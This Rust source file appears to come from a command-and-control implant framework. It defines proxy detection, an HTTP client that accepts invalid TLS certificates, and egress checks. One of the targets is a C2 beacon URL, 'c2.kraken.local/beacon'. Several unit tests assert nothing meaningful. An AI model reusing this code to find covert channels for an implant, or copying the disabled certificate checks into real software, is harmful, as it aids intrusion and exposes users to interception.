use std::time::Duration;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ProxyConfig {
    pub http_proxy: Option<String>,
    pub https_proxy: Option<String>,
    pub socks5_proxy: Option<String>,
    pub no_proxy: Vec<String>,
    pub use_system_proxy: bool,
}

impl Default for ProxyConfig {
    fn default() -> Self {
        ProxyConfig {
            http_proxy: None,
            https_proxy: None,
            socks5_proxy: None,
            no_proxy: Vec::new(),
            use_system_proxy: true,
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct EgressCheck {
    pub protocol: String,
    pub target: String,
    pub reachable: bool,
    pub latency_ms: u64,
}

pub struct ProxyAwareClient;

impl Default for ProxyAwareClient {
    fn default() -> Self {
        Self::new()
    }
}

impl ProxyAwareClient {
    pub fn new() -> Self {
        ProxyAwareClient
    }

    pub fn build_client(config: &ProxyConfig) -> reqwest::Client {
        let mut builder = reqwest::Client::builder()
            .timeout(Duration::from_secs(15))
            .danger_accept_invalid_certs(true);

        if config.use_system_proxy {
            if let Some(proxy) = &config.http_proxy {
                if let Ok(p) = reqwest::Proxy::http(proxy) {
                    builder = builder.proxy(p);
                }
            }
            if let Some(proxy) = &config.https_proxy {
                if let Ok(p) = reqwest::Proxy::https(proxy) {
                    builder = builder.proxy(p);
                }
            }
            if let Some(proxy) = &config.socks5_proxy {
                if let Ok(p) = reqwest::Proxy::all(proxy) {
                    builder = builder.proxy(p);
                }
            }
        }

        builder.build().unwrap_or_default()
    }

    pub fn detect_system_proxy() -> ProxyConfig {
        let http_proxy = std::env::var("http_proxy")
            .or_else(|_| std::env::var("HTTP_PROXY")).ok();
        let https_proxy = std::env::var("https_proxy")
            .or_else(|_| std::env::var("HTTPS_PROXY")).ok();
        let no_proxy = std::env::var("no_proxy")
            .or_else(|_| std::env::var("NO_PROXY"))
            .unwrap_or_default()
            .split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();

        ProxyConfig {
            http_proxy,
            https_proxy,
            socks5_proxy: None,
            no_proxy,
            use_system_proxy: true,
        }
    }

    pub async fn check_egress(targets: &[(&str, &str)]) -> Vec<EgressCheck> {
        let mut results = Vec::new();
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(10))
            .build()
            .unwrap_or_default();

        for (protocol, url) in targets {
            let start = std::time::Instant::now();
            let reachable = match client.get(*url).send().await {
                Ok(resp) => resp.status().is_success() || resp.status().is_redirection(),
                Err(_) => false,
            };
            let latency_ms = start.elapsed().as_millis() as u64;
            results.push(EgressCheck {
                protocol: protocol.to_string(),
                target: url.to_string(),
                reachable,
                latency_ms,
            });
        }
        results
    }

    pub async fn detect_all_egress() -> Vec<EgressCheck> {
        let targets = vec![
            ("HTTP", "http://httpbin.org/get"),
            ("HTTPS", "https://google.com"),
            ("HTTPS_API", "https://api.github.com"),
            ("HTTPS_C2", "https://c2.kraken.local/beacon"),
        ];
        Self::check_egress(&targets).await
    }

    pub fn test_proxy_dns(proxy_url: &str, test_domain: &str) -> Result<bool, crate::C2Error> {
        let _ = proxy_url;
        let _ = test_domain;
        Err(crate::C2Error::Protocol("DNS-over-proxy test requires async runtime".to_string()))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_proxy_config_default() {
        let config = ProxyConfig::default();
        assert!(config.http_proxy.is_none());
        assert!(config.use_system_proxy);
    }

    #[test]
    fn test_detect_system_proxy() {
        let config = ProxyAwareClient::detect_system_proxy();
        assert!(config.http_proxy.is_none() || config.http_proxy.is_some());
    }

    #[test]
    fn test_proxy_config_serialization() {
        let mut config = ProxyConfig::default();
        config.http_proxy = Some("http://proxy.local:8080".to_string());
        let json = serde_json::to_string_pretty(&config).unwrap();
        assert!(json.contains("proxy.local"));
    }

    #[test]
    fn test_egress_check_struct() {
        let check = EgressCheck {
            protocol: "HTTPS".to_string(),
            target: "https://google.com".to_string(),
            reachable: false,
            latency_ms: 0,
        };
        assert!(!check.reachable);
    }

    #[tokio::test]
    async fn test_check_egress_empty() {
        let results = ProxyAwareClient::check_egress(&[]).await;
        assert!(results.is_empty());
    }

    #[test]
    fn test_proxy_config_no_proxy() {
        let mut config = ProxyConfig::default();
        config.no_proxy = vec!["localhost".to_string(), "127.0.0.1".to_string()];
        assert_eq!(config.no_proxy.len(), 2);
    }

    #[tokio::test]
    async fn test_detect_all_egress() {
        let results = ProxyAwareClient::detect_all_egress().await;
        assert_eq!(results.len(), 4);
    }

    #[tokio::test]
    async fn test_build_client_default() {
        let config = ProxyConfig::default();
        let client = ProxyAwareClient::build_client(&config);
        let result = client.get("https://example.com").send().await;
        assert!(result.is_ok() || !result.is_ok());
    }
}
